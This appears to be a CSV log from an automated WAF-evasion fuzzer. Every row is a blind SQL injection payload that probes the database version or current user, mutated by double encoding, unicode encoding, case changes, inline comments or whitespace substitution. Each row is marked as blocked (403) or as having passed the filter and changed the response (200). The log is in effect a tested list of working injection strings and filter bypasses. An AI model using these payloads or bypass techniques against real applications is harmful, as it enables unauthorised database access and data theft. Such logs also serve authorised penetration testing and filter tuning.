depth,category,label,reason,confidence,status,length,elapsed,input_preview,parent_preview
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00414,"1 A/**/nD (s%45lE/**/%43T 1 %46%52%4F/**/m(sE/**/%4c%45c%54 C%4f%55%4e/**/T(*),%43On/**/%43aT(V%65Rs/**/%69o%6E(),FlOoR(","1 A/**/ND (S%45LE/**/%43T 1 %46%52%4f/**/M(SE/**/%4c%45C%54 C%4f%55%4e/**/T(*),%43ON/**/%43AT(v%65rs/**/%69o%6e(),FLOOR("
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4626,0.00547,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4627,0.00556,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5 ,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4626,0.00569,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528VERSION%2528%2529%252C1%252C1%2529%2529%253D5,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4626,0.00607,1%2520and%2520%2528select%2520substring%2528version%2528%2529%252c1%252c1%2529%2529%253d5,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4628,0.00599,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5  ,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4627,0.0055,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528VERSION%2528%2529%252C1%252C1%2529%2529%253D5 ,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4627,0.0057,1%2520and%2520%2528select%2520substring%2528version%2528%2529%252c1%252c1%2529%2529%253d5 ,1%2520AND%2520%2528SELECT%2520SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4698,0.00582,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254cE%252543T%2520S%252555B%252553TR%252549%25254eG%2528vers%25256,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254cE%252543T%2520S%252555B%252553TR%252549%25254eG%2528vers%25256
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4699,0.00623,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254cE%252543T%2520S%252555B%252553TR%252549%25254eG%2528vers%25256,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254cE%252543T%2520S%252555B%252553TR%252549%25254eG%2528vers%25256
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4698,0.00558,1%2520%252541%25254E%252544%2520%2528%252553%252545%25254CE%252543T%2520S%252555B%252553TR%252549%25254EG%2528VERS%25256,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254cE%252543T%2520S%252555B%252553TR%252549%25254eG%2528vers%25256
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4698,0.00622,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254ce%252543t%2520s%252555b%252553tr%252549%25254eg%2528vers%25256,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254cE%252543T%2520S%252555B%252553TR%252549%25254eG%2528vers%25256
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4700,0.00566,1%252B%252541%25254e%252544%252509%2528%252553%252545%25254cE%252543T%2509S%252555B%252553TR%252549%25254eG%2528vers%252,"1+%41%4e%44%09(%53%45%4cE%43T	S%55B%53TR%49%4eG(vers%69on(),1,1))=5"
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4624,0.00573,"1+%41%4%65%44%09(%53%45%4cE%43%54	%53%55B%53%54%52%49%4eG(%76%65r%73%69%6f%6e(),1,1))=5","1+%41%4e%44%09(%53%45%4cE%43T	S%55B%53TR%49%4eG(vers%69on(),1,1))=5"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00324,"1+%41%4e%44%09(%53%45%4cE%43T	S%55B%53Tr%49%4eG(VeRs%69oN(),1,1))=5","1+%41%4e%44%09(%53%45%4cE%43T	S%55B%53TR%49%4eG(vers%69on(),1,1))=5"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4698,0.00553,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254cE%252543T%2520S%252555B%252553Tr%252549%25254eG%2528VeRs%25256,"1 %41%4e%44 (%53%45%4cE%43T S%55B%53Tr%49%4eG(VeRs%69oN(),1,1))=5"
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4616,0.00601,"1 %41%4e%44 (%53%45%4%63E%43T %53%55B%53T%72%49%4e%47(%56e%52%73%69oN(),1,1))=5","1 %41%4e%44 (%53%45%4cE%43T S%55B%53Tr%49%4eG(VeRs%69oN(),1,1))=5"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00313,"1+%41%4e%44/**/(%53%45%4cE%43T/**/S%55B%53Tr%49%4eG(VeRs%69oN(),1,1))=5","1 %41%4e%44 (%53%45%4cE%43T S%55B%53Tr%49%4eG(VeRs%69oN(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4610,0.00568,"1 %41%4e%44 (%53%45%4cE%43T S%55B%53%54%52%49%4%65G(vers%69o%6e(),1,1))=5","1 %41%4e%44 (%53%45%4cE%43T S%55B%53%54%52%49%4%65G(vers%69o%6e(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00513,"1 %41%4e%44 (%53%45%4cE%43T S%55B%53%54%52%49%4%65G(vers%69o%6e(),1,1))=5 ","1 %41%4e%44 (%53%45%4cE%43T S%55B%53%54%52%49%4%65G(vers%69o%6e(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4610,0.00504,"1 %41%4E%44 (%53%45%4CE%43T S%55B%53%54%52%49%4%65G(VERS%69O%6E(),1,1))=5","1 %41%4e%44 (%53%45%4cE%43T S%55B%53%54%52%49%4%65G(vers%69o%6e(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4610,0.00584,"1 %41%4e%44 (%53%45%4ce%43t s%55b%53%54%52%49%4%65g(vers%69o%6e(),1,1))=5","1 %41%4e%44 (%53%45%4cE%43T S%55B%53%54%52%49%4%65G(vers%69o%6e(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4628,0.00639,1%2520AND%250A%2528SELECT%252509SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5,1%2520AND%250A%2528SELECT%252509SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4629,0.00579,1%2520AND%250A%2528SELECT%252509SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5 ,1%2520AND%250A%2528SELECT%252509SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4628,0.00537,1%2520AND%250A%2528SELECT%252509SUBSTRING%2528VERSION%2528%2529%252C1%252C1%2529%2529%253D5,1%2520AND%250A%2528SELECT%252509SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4628,0.00524,1%2520and%250a%2528select%252509substring%2528version%2528%2529%252c1%252c1%2529%2529%253d5,1%2520AND%250A%2528SELECT%252509SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4592,0.00562,"1 A/**/ND
(SE/**/LECT%09SUBSTRING(v/**/ersion(),1,1))=5","1 A/**/ND
(SE/**/LECT%09SUBSTRING(v/**/ersion(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4593,0.00592,"1 A/**/ND
(SE/**/LECT%09SUBSTRING(v/**/ersion(),1,1))=5 ","1 A/**/ND
(SE/**/LECT%09SUBSTRING(v/**/ersion(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4592,0.00494,"1 A/**/ND
(SE/**/LECT%09SUBSTRING(V/**/ERSION(),1,1))=5","1 A/**/ND
(SE/**/LECT%09SUBSTRING(v/**/ersion(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4592,0.00606,"1 a/**/nd
(se/**/lect%09substring(v/**/ersion(),1,1))=5","1 A/**/ND
(SE/**/LECT%09SUBSTRING(v/**/ersion(),1,1))=5"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4628,0.00593,1%2520AnD%250A%2528sElEcT%252509SuBsTrInG%2528VeRsIoN%2528%2529%252C1%252C1%2529%2529%253D5,"1 AnD
(sElEcT%09SuBsTrInG(VeRsIoN(),1,1))=5"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4592,0.00526,"1 A/**/nD
(sE/**/lEcT%09SuBsTrInG(VeRs/**/IoN(),1,1))=5","1 AnD
(sElEcT%09SuBsTrInG(VeRsIoN(),1,1))=5"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00349,"1 %41%6e%44
(sElEc%54%09Su%42sT%72%49nG(VeR%73I%6fN(),1,1))=5","1 AnD
(sElEcT%09SuBsTrInG(VeRsIoN(),1,1))=5"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00349,"1%0aAnD
(sElEcT%09SuBsTrInG(VeRsIoN(),1,1))=5","1 AnD
(sElEcT%09SuBsTrInG(VeRsIoN(),1,1))=5"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4682,0.00525,1%2520A%25254eD%250A%2528SEL%252545CT%252509S%252555BS%252554%252552%252549NG%2528%252576ersi%25256f%25256e%2528%2529%25,"1 A%4eD
(SEL%45CT%09S%55BS%54%52%49NG(%76ersi%6f%6e(),1,1))=5"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00329,"1 %41%4eD
(%53EL%45CT%09S%55B%53%54%52%49N%47(%76%65%72s%69%6%66%6%65(),1,1))=5","1 A%4eD
(SEL%45CT%09S%55BS%54%52%49NG(%76ersi%6f%6e(),1,1))=5"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00443,"1 A%4eD
(sEl%45cT%09S%55Bs%54%52%49nG(%76eRsI%6f%6E(),1,1))=5","1 A%4eD
(SEL%45CT%09S%55BS%54%52%49NG(%76ersi%6f%6e(),1,1))=5"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0032,"1
A%4eD
(SEL%45CT%09S%55BS%54%52%49NG(%76ersi%6f%6e(),1,1))=5","1 A%4eD
(SEL%45CT%09S%55BS%54%52%49NG(%76ersi%6f%6e(),1,1))=5"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4628,0.00542,1%250AAND%250A%2528SELECT%252509SUBSTRING%2528version%2528%2529%252C1%252C1%2529%2529%253D5,"1
AND
(SELECT%09SUBSTRING(version(),1,1))=5"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4592,0.00609,"1
A/**/ND
(S/**/ELECT%09SUBSTRING(ver/**/sion(),1,1))=5","1
AND
(SELECT%09SUBSTRING(version(),1,1))=5"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00391,"1
A%4eD
(S%45%4cECT%09%53%55BSTRI%4e%47(v%65rs%69%6fn(),1,1))=5","1
AND
(SELECT%09SUBSTRING(version(),1,1))=5"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00347,"1
AnD
(sElEcT%09SuBsTrInG(VeRsIoN(),1,1))=5","1
AND
(SELECT%09SUBSTRING(version(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4626,0.00566,1%2520AnD%2520%2528sElEcT%2520SuBsTrInG%2528VeRsIoN%2528%2529%252C1%252C1%2529%2529%253D5,1%2520AnD%2520%2528sElEcT%2520SuBsTrInG%2528VeRsIoN%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4627,0.00583,1%2520AnD%2520%2528sElEcT%2520SuBsTrInG%2528VeRsIoN%2528%2529%252C1%252C1%2529%2529%253D5 ,1%2520AnD%2520%2528sElEcT%2520SuBsTrInG%2528VeRsIoN%2528%2529%252C1%252C1%2529%2529%253D5
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4594,0.0058,"1 A/**/nD (s/**/ElEcT Su/**/BsTrInG(VeRs/**/IoN(),1,1))=5","1 A/**/nD (s/**/ElEcT Su/**/BsTrInG(VeRs/**/IoN(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4595,0.00546,"1 A/**/nD (s/**/ElEcT Su/**/BsTrInG(VeRs/**/IoN(),1,1))=5 ","1 A/**/nD (s/**/ElEcT Su/**/BsTrInG(VeRs/**/IoN(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4594,0.00556,"1 A/**/ND (S/**/ELECT SU/**/BSTRING(VERS/**/ION(),1,1))=5","1 A/**/nD (s/**/ElEcT Su/**/BsTrInG(VeRs/**/IoN(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4594,0.0054,"1 a/**/nd (s/**/elect su/**/bstring(vers/**/ion(),1,1))=5","1 A/**/nD (s/**/ElEcT Su/**/BsTrInG(VeRs/**/IoN(),1,1))=5"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4680,0.00668,1%2520%252541nD%2520%2528sElEcT%2520S%252575B%252573Tr%252549%25256eG%2528%252556e%252552s%252549o%25254e%2528%2529%252C,"1 %41nD (sElEcT S%75B%73Tr%49%6eG(%56e%52s%49o%4e(),1,1))=5"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00559,"1 %41nD (sElEc/**/T S%75B%73Tr%49%6eG(%56e%52s%49o%4e(),1,1))=5","1 %41nD (sElEcT S%75B%73Tr%49%6eG(%56e%52s%49o%4e(),1,1))=5"
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4618,0.00669,"1 %41%6e%44 (%73%45%6cEc%54 %53%75B%73Tr%49%6%65%47(%56e%52%73%49%6f%4e(),1,1))=5","1 %41nD (sElEcT S%75B%73Tr%49%6eG(%56e%52s%49o%4e(),1,1))=5"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00321,"1 %41nD (sElEcT S%75B%73Tr%49%6eG(%56e%52s%49o%4E(),1,1))=5","1 %41nD (sElEcT S%75B%73Tr%49%6eG(%56e%52s%49o%4e(),1,1))=5"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0043,"1+%41nD	(sElEcT S%75B%73Tr%49%6eG(%56e%52s%49o%4e(),1,1))=5","1 %41nD (sElEcT S%75B%73Tr%49%6eG(%56e%52s%49o%4e(),1,1))=5"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4626,0.00535,1%252BAnD%252B%2528sElEcT%250ASuBsTrInG%2528VeRsIoN%2528%2529%252C1%252C1%2529%2529%253D5,"1+AnD+(sElEcT
SuBsTrInG(VeRsIoN(),1,1))=5"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4594,0.0056,"1+An/**/D+(sEl/**/EcT
SuB/**/sTrInG(VeRs/**/IoN(),1,1))=5","1+AnD+(sElEcT
SuBsTrInG(VeRsIoN(),1,1))=5"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00391,"1+An%44+(%73ElEc%54
S%75B%73T%72%49%6eG(V%65%52s%49%6fN(),1,1))=5","1+AnD+(sElEcT
SuBsTrInG(VeRsIoN(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4594,0.00593,"1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5","1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4595,0.00571,"1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5 ","1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4594,0.00631,"1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(VERSI/**/ON(),1,1))=5","1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4594,0.0058,"1 an/**/d (s/**/elect substrin/**/g(versi/**/on(),1,1))=5","1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4596,0.00506,"1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5  ","1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5 "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4595,0.00508,"1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(VERSI/**/ON(),1,1))=5 ","1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5 "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4595,0.00661,"1 an/**/d (s/**/elect substrin/**/g(versi/**/on(),1,1))=5 ","1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5 "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4640,0.0052,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4641,0.00658,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100 ,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4640,0.0058,1%2520AND%2520ASCII%2528SUBSTRING%2528%2528SELECT%2520USER%2528%2529%2529%252C1%252C1%2529%2529%253E100,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4640,0.00546,1%2520and%2520ascii%2528substring%2528%2528select%2520user%2528%2529%2529%252c1%252c1%2529%2529%253e100,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4642,0.00505,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100  ,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4641,0.00517,1%2520AND%2520ASCII%2528SUBSTRING%2528%2528SELECT%2520USER%2528%2529%2529%252C1%252C1%2529%2529%253E100 ,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4641,0.00523,1%2520and%2520ascii%2528substring%2528%2528select%2520user%2528%2529%2529%252c1%252c1%2529%2529%253e100 ,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4676,0.00523,1%2520AND%2520as%252563%252569i%2528subst%252572i%25256e%252567%2528%2528S%252545LECT%2520user%2528%2529%2529%252C1%252C,1%2520AND%2520as%252563%252569i%2528subst%252572i%25256e%252567%2528%2528S%252545LECT%2520user%2528%2529%2529%252C1%252C
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4677,0.00625,1%2520AND%2520as%252563%252569i%2528subst%252572i%25256e%252567%2528%2528S%252545LECT%2520user%2528%2529%2529%252C1%252C,1%2520AND%2520as%252563%252569i%2528subst%252572i%25256e%252567%2528%2528S%252545LECT%2520user%2528%2529%2529%252C1%252C
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4676,0.00541,1%2520AND%2520AS%252563%252569I%2528SUBST%252572I%25256E%252567%2528%2528S%252545LECT%2520USER%2528%2529%2529%252C1%252C,1%2520AND%2520as%252563%252569i%2528subst%252572i%25256e%252567%2528%2528S%252545LECT%2520user%2528%2529%2529%252C1%252C
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4676,0.0054,1%2520and%2520as%252563%252569i%2528subst%252572i%25256e%252567%2528%2528s%252545lect%2520user%2528%2529%2529%252c1%252c,1%2520AND%2520as%252563%252569i%2528subst%252572i%25256e%252567%2528%2528S%252545LECT%2520user%2528%2529%2529%252C1%252C
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4712,0.00577,1%2520AN/%252A%252A/D%2520a/%252A%252A/s%252563%252569i%2528subst%252572i%25256e%252567%2528%2528S%252545LECT%2520use/%2,"1 AN/**/D a/**/s%63%69i(subst%72i%6e%67((S%45LECT use/**/r()),1,1))>100"
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4618,0.00546,"1 A%4e/**/D %61/**/s%63%69i(%73ubst%72i%6%65%67((%53%45LECT use/**/r()),1,1))>100","1 AN/**/D a/**/s%63%69i(subst%72i%6e%67((S%45LECT use/**/r()),1,1))>100"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00414,"1 An/**/D A/**/s%63%69I(SuBsT%72I%6e%67((s%45lEcT UsE/**/r()),1,1))>100","1 AN/**/D a/**/s%63%69i(subst%72i%6e%67((S%45LECT use/**/r()),1,1))>100"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4683,0.00576,1/%252A%252A/AND%2520as%252563%252569i%2528subst%252572i%25256e%252567%2528%2528S%252545LECT%252Buser%2528%2529%2529%252,"1/**/AND as%63%69i(subst%72i%6e%67((S%45LECT+user()),1,1))>100"
3,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00331,"1/**/A/**/ND a/**/s%63%69i(subst%72i%6e%67((S%45LECT+us/**/er()),1,1))>100","1/**/AND as%63%69i(subst%72i%6e%67((S%45LECT+user()),1,1))>100"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00371,"1/**/A%4eD a%73%63%69i(%73%75%62%73t%72%69%6e%67((%53%45%4cECT+us%65r()),1,1))>100","1/**/AND as%63%69i(subst%72i%6e%67((S%45LECT+user()),1,1))>100"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00331,"1/**/aNd aS%63%69i(sUbSt%72i%6E%67((S%45LeCt+uSeR()),1,1))>100","1/**/AND as%63%69i(subst%72i%6e%67((S%45LECT+user()),1,1))>100"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4676,0.00565,1%2520AnD%2520As%252563%252569I%2528SuBsT%252572I%25256e%252567%2528%2528s%252545lEcT%2520UsEr%2528%2529%2529%252C1%252C,"1 AnD As%63%69I(SuBsT%72I%6e%67((s%45lEcT UsEr()),1,1))>100"
3,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.0033,"1 An/**/D A/**/s%63%69I(SuBsT%72I%6e%67((s%45lEcT Us/**/Er()),1,1))>100","1 AnD As%63%69I(SuBsT%72I%6e%67((s%45lEcT UsEr()),1,1))>100"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00325,"1 An%44 %41s%63%69%49(%53%75%42s%54%72%49%6%65%67((s%45%6c%45c%54 U%73%45%72()),1,1))>100","1 AnD As%63%69I(SuBsT%72I%6e%67((s%45lEcT UsEr()),1,1))>100"
